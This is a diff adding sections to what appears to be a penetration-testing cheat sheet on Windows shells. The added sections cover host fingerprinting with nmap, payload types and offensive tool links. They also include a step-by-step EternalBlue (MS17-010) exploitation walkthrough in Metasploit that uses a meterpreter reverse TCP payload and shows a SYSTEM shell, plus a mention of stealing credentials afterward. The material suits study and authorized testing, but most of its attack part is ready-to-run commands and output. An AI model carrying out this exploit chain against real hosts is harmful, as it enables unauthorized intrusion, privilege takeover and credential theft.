@@ -182,16 +182,219 @@ The payload in this form would almost certainly be detected by Windows Defender 
 <details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 <summary><h1>🪟 Windows Shells</h1></summary>  
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 <summary><h3>Infiltrating Windows</h3></summary>  
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Enumerating Windows & Fingerprinting Methods</h4></summary>  
 
-**Target Machine: Starting Netcat listener**  
+When utilizing ICMP to determine if the host is up, a typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see.  
+
+**Attack Machine:** Ping target
+```bash
+PING <WINDOWS IP> (<WINDOWS IP>): 56 data bytes
+64 bytes from <WINDOWS IP>: icmp_seq=0 ttl=128 time=102.920 ms
+64 bytes from <WINDOWS IP>: icmp_seq=1 ttl=128 time=9.164 ms
+64 bytes from <WINDOWS IP>: icmp_seq=2 ttl=128 time=14.223 ms
+64 bytes from <WINDOWS IP>: icmp_seq=3 ttl=128 time=11.265 ms
+```
+
+**Attack Machine:** Initialize an OS Identification scan against our target  
 
 ```bash
-nc -lvnp <PORT>
+sudo nmap -v -O <WINDOWS IP>
 ```
+
+**Attack Machine:** For each port Nmap sees as up, it will attempt to connect to the port and glean any information it can from it.  
+
+```bash
+sudo nmap -v <WINDOWS IP> --script banner.nse
+```
+
+> The examples shown above are just a few ways to help fingerprint and determine if a host is a Windows machine. It is by no means an exhaustive list, and there are many other checks you can do.
 
 </details>
 
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Payload Types to Consider</h4></summary>
+
+**DLLs:** File used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. Injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
+
+**Batch:** Text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter.  
+
+**VBS:** Lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
+
+**MSI:** When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.
+
+**Powershell:** It is both a shell environment and scripting language. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.
+
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Procedures for Payload Generation, Transfer, and Execution</h4></summary>
+
+* [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework): MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.
+
+* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings): Here, you can find many different resources and cheat sheets for payload generation and general methodology.
+
+* [Mythic C2 Framework](https://github.com/its-a-feature/Mythic): Alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.
+
+* [Nishang](https://github.com/samratashok/nishang): Framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.
+
+* [Darkarmour](https://github.com/bats3c/darkarmour): Tool to generate and utilize obfuscated binaries for use against Windows hosts.
+
+</details>
+
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h3>Example Compromise Walkthrough</h3></summary>
+
+**Attack Machine: Enumerate the host**  
+
+```bash
+sudo nmap -sS -sV -sC -v -A -O <WINDOWS IP> --script banner.nse -oX nmap_target_xml_scan.xml > /dev/null 1 2>&1
+
+xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
+```
+
+**Attack Machine: Start Metasploit**  
+
+Open msfconsole and search for the for the identified service.
+
+```bash
+msfconsole
+```
+
+**Attack Machine: Determine an Exploit Path**  
+
+```bash
+use auxiliary/scanner/smb/smb_ms17_010 
+show options
+set RHOSTS <WINDOWS IP>
+run
+```
+
+Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.
+
+**Attack Machine: Choose & Configure Our Exploit & Payload**
+
+```bash
+search eternal
+use 2
+options
+```
+
+Since I have had more luck with the psexec version of this exploit, we will try that one first. Let's choose it and continue the setup.
+
+**Attack Machine: Validate Our Options**  
+
+```bash
+show options
+```
+
+This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload.
+
+**Attack Machine: Execute Our Attack**  
+
+```bash
+exploit
+
+# [*] Started reverse TCP handler on <ATTACKER IP>:4444 
+# [*] <WINDOWS IP>:445 - Target OS: Windows Server 2016 Standard 14393
+# [*] <WINDOWS IP>:445 - Built a write-what-where primitive...
+# [+] <WINDOWS IP>:445 - Overwrite complete... SYSTEM session obtained!
+```
+
+Now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt
+If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.
+
+**Attack Machine: Verify Our Session**  
+
+```bash
+getuid
+
+# Server username: NT AUTHORITY\SYSTEM
+```
+
+From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host.
+
+
+**Attack Machine: Identify Our Shell**  
+```bash
+shell
+
+# Process 4844 created.
+# Channel 1 created.
+# Microsoft Windows [Version 10.0.14393]
+# (c) 2016 Microsoft Corporation. All rights reserved.
+
+# C:\Windows\system32>
+```
+
+When we executed the Meterpreter command shell, it started another process on the host and dropped us into a system shell.
+
+
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h3>CMD or PowerShell</h3></summary>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Differences</h4></summary>
+
+# CMD vs PowerShell Comparison
+
+| Feature          | CMD                              | PowerShell                      |
+|------------------|----------------------------------|---------------------------------|
+| **Origin**       | Original MS-DOS shell            | Designed to expand CMD's capabilities |
+| **Command Language** | Native MS-DOS commands (`dir`, `ipconfig`) | Supports both MS-DOS and **.NET cmdlets** (`Get-ChildItem`, `Copy-Item`) |
+| **Input/Output** | Text-based                       | **.NET objects** (structured data) |
+| **Scripting**    | Basic batch files (`.bat`, `.cmd`) | Advanced scripts (`.ps1`) with loops, modules, and functions |
+| **Command History** | **No** session logging | Keeps history of executed commands |
+| **Security**     | No Execution Policy restrictions | Restricted by **Execution Policy** (e.g., `Restricted`, `RemoteSigned`) and UAC |
+| **Availability** | Works on **all Windows versions** | Only available on **Windows 7+** |
+| **Extensibility** | Limited to built-in commands | Supports **custom modules** and cmdlets |
+
+
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Which one is the right one to use?</h4></summary>
+
+**Use CMD when:**
+
+* You are on an older host that may not include PowerShell.
+
+* When you only require simple interactions/access to the host.
+
+* When you plan to use simple batch files, net commands, or MS-DOS native tools.
+
+* When you believe that execution policies may affect your ability to run scripts or other actions on the host.
+
+**Use PowerShell when:**
+
+* You are planning to utilize cmdlets or other custom-built scripts.
+
+* When you wish to interact with .NET objects instead of text output.
+
+* When being stealthy is of lesser concern.
+
+* If you are planning to interact with cloud-based services and hosts.
+
+* If your scripts set and use Aliases.
+
+</details>
+
+> **Note:** PowerShell is more powerful but leaves traces (command history). CMD is lightweight but lacks advanced features.
+
+</details>
 
 </details>
